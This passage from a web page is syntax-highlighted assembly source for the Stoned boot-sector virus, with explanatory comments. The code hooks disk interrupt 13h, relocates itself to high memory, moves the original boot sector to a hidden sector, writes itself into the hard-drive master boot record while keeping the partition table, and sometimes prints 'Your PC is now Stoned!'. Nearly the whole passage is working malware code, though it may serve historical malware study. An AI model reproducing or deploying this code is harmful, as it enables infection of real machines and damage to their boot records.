        </span><span class="sc6">SHL</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CL</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">

</span><span class="sc1">;*********************************************************</span><span class="sc0">
</span><span class="sc1">;        Use the segment of the stolen memory area</span><span class="sc0">
</span><span class="sc1">;*********************************************************</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">J_AD_S</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">    </span><span class="sc1">;Becomes part of a JMP address</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">NEW_13</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc2">4CH</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">       </span><span class="sc1">;Offset for new INT 13</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc2">4EH</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc0">       </span><span class="sc1">;Segment for new INT 13</span><span class="sc0">

</span><span class="sc1">;****************************************************************</span><span class="sc0">
</span><span class="sc1">;Copy the code from 07C0:0000 to ES:0000 (the stolen memory area)</span><span class="sc0">
</span><span class="sc1">;****************************************************************</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">END_BYT</span><span class="sc0"> </span><span class="sc1">;The size of the code (# of bytes to move)</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">              </span><span class="sc1">;DS = CS</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">           </span><span class="sc1">;All offsets of block move areas are 0</span><span class="sc0">
        </span><span class="sc6">CLD</span><span class="sc0">
        </span><span class="sc6">REPZ</span><span class="sc0">    </span><span class="sc6">MOVSB</span><span class="sc0">           </span><span class="sc1">;Copy each byte of code to the top of memory</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0">       </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">JMP_ADR</span><span class="sc0"> </span><span class="sc1">;JMP to the transferred code...</span><span class="sc0">



</span><span class="sc1">;**************************************************************</span><span class="sc0">
</span><span class="sc1">;    ...and we'll jump right here, to the transferred code</span><span class="sc0">
</span><span class="sc1">;**************************************************************</span><span class="sc0">



</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc1">; Redefine variable offsets again. This code executes at the top of memory,</span><span class="sc0">
</span><span class="sc1">;  and so the exact value of the segment registers depends on how much memory</span><span class="sc0">
</span><span class="sc1">;  is installed. The variable offsets have an assembled value of the order of</span><span class="sc0">
</span><span class="sc1">;  00xx. They are accessed using the CS: segment override</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">

</span><span class="sc5">D_TYPE</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">_D_TYPE</span><span class="sc0">
</span><span class="sc5">O_13_O</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">_O_13_O</span><span class="sc0">
</span><span class="sc5">O_13_S</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">_O_13_S</span><span class="sc0">
</span><span class="sc5">J_AD_O</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">_J_AD_O</span><span class="sc0">
</span><span class="sc5">J_AD_S</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">_J_AD_S</span><span class="sc0">
</span><span class="sc5">BT_ADD</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">_BT_ADD</span><span class="sc0">


</span><span class="sc5">HI_JMP</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">13H</span><span class="sc0">             </span><span class="sc1">;Reset disk system</span><span class="sc0">

</span><span class="sc1">;**********************************************************************</span><span class="sc0">
</span><span class="sc1">;  This will read one sector into 0000:7C00 (the boot sector address)</span><span class="sc0">
</span><span class="sc1">;**********************************************************************</span><span class="sc0">

        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">201H</span><span class="sc0">                 </span><span class="sc1">;Read one sector</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc2">7C00H</span><span class="sc0">         </span><span class="sc1">;To boot sector area: 0000:7C00</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">D_TYPE</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;Booting from diskette or hard drive?</span><span class="sc0">

        </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">DISKET</span><span class="sc0">                  </span><span class="sc1">;If booting from a diskette</span><span class="sc0">

</span><span class="sc1">;******************************************************</span><span class="sc0">
</span><span class="sc1">;            Booting from a hard drive</span><span class="sc0">
</span><span class="sc1">;******************************************************</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">            </span><span class="sc1">;Track 0, sector 7</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">80H</span><span class="sc0">          </span><span class="sc1">;Hard drive, side 0</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">13H</span><span class="sc0">             </span><span class="sc1">;Go get it</span><span class="sc0">

</span><span class="sc1">;  ***NOTE** There was no check as to wether or not the read was sucessful</span><span class="sc0">

        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc9">SHORT</span><span class="sc0">   </span><span class="sc5">BOOTUP</span><span class="sc0">  </span><span class="sc1">;Go run the real boot sector we've installed</span><span class="sc0">

        </span><span class="sc6">NOP</span><span class="sc0">

</span><span class="sc1">;******************************************************</span><span class="sc0">
</span><span class="sc1">;            Booting from a diskette</span><span class="sc0">
</span><span class="sc1">;******************************************************</span><span class="sc0">

</span><span class="sc5">DISKET</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">            </span><span class="sc1">;Track 0, sector 3</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">100H</span><span class="sc0">         </span><span class="sc1">;A drive, side 1 (last sector of the directory)</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">13H</span><span class="sc0">             </span><span class="sc1">;Go get it</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">BOOTUP</span><span class="sc0">          </span><span class="sc1">;If read error, run it anyway.(???) (A prank?)</span><span class="sc0">

</span><span class="sc1">;****************************************************************</span><span class="sc0">
</span><span class="sc1">;Wether or not we print the "Stoned" message depends on the value</span><span class="sc0">
</span><span class="sc1">; of a byte in the internal clock time -- a fairly random event.</span><span class="sc0">
</span><span class="sc1">;****************************************************************</span><span class="sc0">

        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:</span><span class="sc2">46CH</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">      </span><span class="sc1">;Test a bit in the clock time</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">GETHDB</span><span class="sc0">                  </span><span class="sc1">;Get Hard drive boot sector</span><span class="sc0">

</span><span class="sc1">;**************************************************************</span><span class="sc0">
</span><span class="sc1">;                      Print the message</span><span class="sc0">
</span><span class="sc1">;**************************************************************</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">S_MSG</span><span class="sc0"> </span><span class="sc1">;Address of the "stoned message"</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">

</span><span class="sc1">;**************************************************************</span><span class="sc0">
</span><span class="sc1">;               Loop to print individual characters</span><span class="sc0">
</span><span class="sc1">;**************************************************************</span><span class="sc0">

</span><span class="sc5">PRINT1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">LODSB</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">           </span><span class="sc1">;A 00 byte means quit the loop</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">GETHDB</span><span class="sc0">          </span><span class="sc1">;Get Hard drive boot sector, then</span><span class="sc0">

</span><span class="sc1">;**************************************************************</span><span class="sc0">
</span><span class="sc1">;         Not done looping. Print another character</span><span class="sc0">
</span><span class="sc1">;**************************************************************</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">0EH</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BH</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">10H</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc9">SHORT</span><span class="sc0">   </span><span class="sc5">PRINT1</span><span class="sc0">  </span><span class="sc1">;Print a character on screen</span><span class="sc0">


</span><span class="sc1">;**************************************************************</span><span class="sc0">
</span><span class="sc1">;               Get Hard drive boot sector</span><span class="sc0">
</span><span class="sc1">;**************************************************************</span><span class="sc0">

</span><span class="sc5">GETHDB</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">201H</span><span class="sc0">         </span><span class="sc1">;Read one sector...</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">200H</span><span class="sc0">         </span><span class="sc1">;...to the buffer following this code...</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">;...from sector 1...</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">80H</span><span class="sc0">          </span><span class="sc1">;...side 0, of the hard drive</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">13H</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">BOOTUP</span><span class="sc0">          </span><span class="sc1">;If error, assume no hard drive</span><span class="sc0">
                                </span><span class="sc1">; So go run the floppy boot sector</span><span class="sc0">

</span><span class="sc1">;***************************************************************************</span><span class="sc0">
</span><span class="sc1">; If no read error, then there really must be a hard drive. Infect it. The</span><span class="sc0">
</span><span class="sc1">;  following code uses the same trick above where the first 4 bytes of the</span><span class="sc0">
</span><span class="sc1">;  boot sector are compared to the first 4 bytes of this code. If they don't</span><span class="sc0">
</span><span class="sc1">;  match exactly, then this hard drive isn't infected.</span><span class="sc0">
</span><span class="sc1">;***************************************************************************</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">200H</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">LODSW</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">DI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">HIDEHD</span><span class="sc0">                  </span><span class="sc1">;Hide real boot sector in hard drive</span><span class="sc0">

        </span><span class="sc6">LODSW</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">HIDEHD</span><span class="sc0">                  </span><span class="sc1">;Hide real boot sector in hard drive</span><span class="sc0">

</span><span class="sc1">;**************************************************************</span><span class="sc0">
</span><span class="sc1">;                Go run the real boot sector</span><span class="sc0">
</span><span class="sc1">;**************************************************************</span><span class="sc0">

</span><span class="sc5">BOOTUP</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">D_TYPE</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0">       </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">BT_ADD</span><span class="sc0">

</span><span class="sc1">;**************************************************************</span><span class="sc0">
</span><span class="sc1">;         Infect - Hide real boot sector in hard drive</span><span class="sc0">
</span><span class="sc1">;**************************************************************</span><span class="sc0">

</span><span class="sc5">HIDEHD</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">D_TYPE</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">    </span><span class="sc1">;Mark this as a hard drive infection</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">301H</span><span class="sc0">                 </span><span class="sc1">;Write i sector...</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">200H</span><span class="sc0">         </span><span class="sc1">;...from the buffer following this code...</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">            </span><span class="sc1">;...to track 0, sector 7...</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">80H</span><span class="sc0">          </span><span class="sc1">;...side 0, of the hard drive...</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">13H</span><span class="sc0">             </span><span class="sc1">;Do it</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">BOOTUP</span><span class="sc0">          </span><span class="sc1">;Go run the real boot sector if failed</span><span class="sc0">

</span><span class="sc1">;**************************************************</span><span class="sc0">
</span><span class="sc1">; Here if the boot sector got written successfully</span><span class="sc0">
</span><span class="sc1">;***************************************************</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">3BEH</span><span class="sc0">         </span><span class="sc1">;Offset of disk partition table in the buffer</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc2">1BEH</span><span class="sc0">         </span><span class="sc1">;Copy it to the same offset in this code</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">242H</span><span class="sc0">         </span><span class="sc1">;Strange. Only need to move 42H bytes. This</span><span class="sc0">
                                </span><span class="sc1">; won't hurt, and will overwrite the copy of</span><span class="sc0">
                                </span><span class="sc1">; the boot sector, maybe giving a bit more</span><span class="sc0">
                                </span><span class="sc1">; concealment.</span><span class="sc0">
        </span><span class="sc6">REPZ</span><span class="sc0">    </span><span class="sc6">MOVSB</span><span class="sc0">           </span><span class="sc1">;Move them</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">301H</span><span class="sc0">         </span><span class="sc1">;Write 1 sector...</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">           </span><span class="sc1">;...of this code...</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">CL</span><span class="sc0">              </span><span class="sc1">;...into sector 1</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">13H</span><span class="sc0">

</span><span class="sc1">; ***NOTE*** no check for a sucessful write</span><span class="sc0">

        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">BOOTUP</span><span class="sc0">          </span><span class="sc1">;Now run the real boot sector</span><span class="sc0">

</span><span class="sc5">S_MSG</span><span class="sc0">   </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc12">'Your PC is now Stoned!'</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc4">,</span><span class="sc5">CR</span><span class="sc4">,</span><span class="sc5">LF</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc5">LF</span><span class="sc0">

</span><span class="sc1">;*************************************************************************</span><span class="sc0">
</span><span class="sc1">; Just garbage. In one version, this contained an extension of the above</span><span class="sc0">
</span><span class="sc1">;  string, saying "LEGALIZE MARIJUANA". Some portions of this text remain</span><span class="sc0">
</span><span class="sc1">;*************************************************************************</span><span class="sc0">

        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">4CH</span><span class="sc4">,</span><span class="sc2">45H</span><span class="sc4">,</span><span class="sc2">47H</span><span class="sc4">,</span><span class="sc2">41H</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">4CH</span><span class="sc4">,</span><span class="sc2">49H</span><span class="sc4">,</span><span class="sc2">53H</span><span class="sc4">,</span><span class="sc2">45H</span><span class="sc4">,</span><span class="sc2">67H</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">2</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc2">68H</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc2">68H</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">2</span><span class="sc4">,</span><span class="sc2">0BH</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc4">,</span><span class="sc2">67H</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">

</span><span class="sc5">END_BYT</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0">               </span><span class="sc1">;Used to determine the size of the code. It</span><span class="sc0">
                                </span><span class="sc1">; must be less than 1BE, or this code is too</span><span class="sc0">
                                </span><span class="sc1">; large to be used to infect hard disks. From</span><span class="sc0">
                                </span><span class="sc1">; offset 1BE and above, the hard disk partition</span><span class="sc0">
                                </span><span class="sc1">; table will be copied, and anything placed</span><span class="sc0">
                                </span><span class="sc1">; there will get clobbered.</span><span class="sc0">

        </span><span class="sc5">CODE</span><span class="sc0">    </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc9">END</span><span class="sc0">
</span></div></body>
</html>
